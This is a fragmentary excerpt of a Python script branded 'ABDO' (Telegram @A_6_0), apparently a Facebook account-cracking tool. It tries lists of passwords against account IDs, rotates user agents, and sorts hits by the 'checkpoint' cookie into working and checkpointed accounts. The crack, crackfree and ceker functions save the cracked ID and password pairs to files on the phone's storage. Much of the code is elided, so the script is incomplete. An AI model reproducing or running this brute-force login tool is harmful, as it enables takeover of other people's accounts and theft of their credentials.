...
#		print(output)
		...
		#print(f"""
#\033[1;35m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# \033[1;32m(\033[1;35m+\033[1;32m) \033[1;33m Telegram\033[1;35m | \033[1;32m @A_6_0 \033[1;35m (\033[1;32m+\033[1;35m) \033[1;33m channel  \033[1;35m | \033[1;32m 𝗔𝗕𝗗𝗢 \n\033[1;35m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# """)
...
def passwrd():
	...
	print( '▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬')  
	print('  \x1b[38;5;208m                 𝐀𝐁𝐃𝐎  ♻️  A_6_0              ')
	print( '▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬')
	print('')
	print('')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r \033[1;37m 𝗔𝗕𝗗𝗢 =  {loop} \033[1;90m-\033[1;37m{len(id)} \033[1;92mOK\033[1;90m-\033[1;93mCP\033[1;90m = \033[1;92m{ok}\033[1;90m-\033[1;93m{cp}  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r\033[1;37m[𝗔𝗕𝗗𝗢-\033[1;93mCP\033[1;37m] \033[1;93m {idf} | {pw}')
				...
				print(f'\r\033[1;37m[𝗔𝗕𝗗𝗢-\033[1;92mOK\033[1;37m] \033[1;92m {idf} | {pw}')
				open('/storage/emulated/0/𝗔𝗕𝗗𝗢-OK/'+okc,'a').write(idf+'|'+pw+'\n')
...
def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r \033[1;37m𝗔𝗕𝗗𝗢 = {loop}\033[1;90m-\033[1;37m{len(id)} \033[1;92mOK\033[1;90m-\033[1;93mCP\033[1;90m = \033[1;92m{ok}\033[1;90m-\033[1;93m{cp}  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
...
def ceker(idf,pw):
	...
	try:
		...
		print('\r%s[𝗔𝗕𝗗𝗢]%s|%s ----> CP       %s'%(b,idf,pw,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
		opsi = kent.find_all('option')
		if len(opsi)==0:
			print('\r%s[𝗔𝗕𝗗𝗢]---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
		else:
			for opsii in opsi:
				print('\r%s[𝗔𝗕𝗗𝗢]---> %s%s'%(kk,opsii.text,x))
	...
	for kes in akun:
		try:
			try:
				...
				time.sleep(2)
				print('\r%s[𝗔𝗕𝗗𝗢]%s ----> Error      %s'%(b,kes,x))
			...
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					...
					print('\r%s[𝗔𝗕𝗗𝗢]%s|%s ----> CP       %s'%(b,id,pw,x))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s[𝗔𝗕𝗗𝗢]--> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
					else:
				...
				print('\r%s[𝗔𝗕𝗗𝗢]%s|%s ----> OK       %s'%(h,id,pw,x))
			else:
